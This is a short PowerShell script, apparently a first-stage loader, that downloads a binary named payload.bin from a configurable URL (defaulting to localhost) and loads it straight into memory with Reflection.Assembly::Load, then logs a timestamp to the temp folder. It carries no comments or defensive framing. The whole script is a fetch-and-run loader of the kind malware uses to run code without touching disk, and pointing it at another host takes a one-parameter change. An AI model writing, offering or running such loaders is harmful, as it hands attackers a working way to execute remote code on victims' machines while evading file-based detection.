
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://localhost:8081/payload.bin'
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($Stage1Url)
[Reflection.Assembly]::Load($AssemblyBytes)
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
